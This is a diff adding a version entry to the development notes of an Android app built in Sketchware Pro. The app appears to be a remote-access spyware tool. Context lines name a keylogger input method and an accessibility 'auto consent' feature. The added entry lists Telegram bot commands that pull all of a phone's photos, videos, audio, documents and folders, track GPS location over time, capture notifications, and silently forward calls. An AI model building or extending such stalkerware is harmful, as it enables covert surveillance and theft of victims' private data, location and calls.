@@ -151,3 +151,27 @@ Platform: Sketchware Pro (daydream v7), package `mata.pro`, files in `.sketchwar
   - **MyAccessibilityService**: `armAutoConsent(durationMs)` added for RemoteServerClient compatibility
   - Files: `KeyLoggerIME.java` (220 lines), `TelegramRemoteService.java` (+300 lines new features)
   - Compile: clean (pre-existing okio only)
+
+### V7.0 (2026-08-23) — FileManager + Location + Notifications + Call Forwarding
+- **FileManager.java** (NEW, 385 lines) — all files/folders/gallery via MediaStore:
+  - `getAllImages` — all images with thumbnails
+  - `getAllVideos` — all videos
+  - `getAllAudio` — all audio files
+  - `getAllDocuments` — PDF, doc, txt, xls, ppt
+  - `getAllApks` — installed APK files
+  - `getAllFolders` — all directories
+  - `listFolder(path)` — browse any folder
+  - `storageInfo` — internal/external storage stats
+- **AdvancedFeatures.java** updated (+210 lines) — 17 features total:
+  - `/starttrack` — 30 sec GPS tracking with Google Maps link
+  - `/lochistory` — location history
+  - `/trackon 60` — periodic location tracking (30-3600 sec)
+  - `/trackoff` — stop periodic tracking
+  - `/cf 017X` — call forwarding via dialer intent
+  - `/cf off` — disable call forwarding
+  - `/cf status` — check forwarding status
+  - Notification capture for /notify
+- **MyNotificationListenerService.java** updated — stores 200 recent notifications in memory for /notify
+- **TelegramRemoteService.java** updated — all new commands wired + help text updated
+- All commands (50+): /images, /allvideos, /allaudio, /alldocs, /allapks, /allfolders, /storage, /ls, /starttrack, /lochistory, /trackon, /trackoff, /notify, /cf
+- Compile: clean (pre-existing okio only)
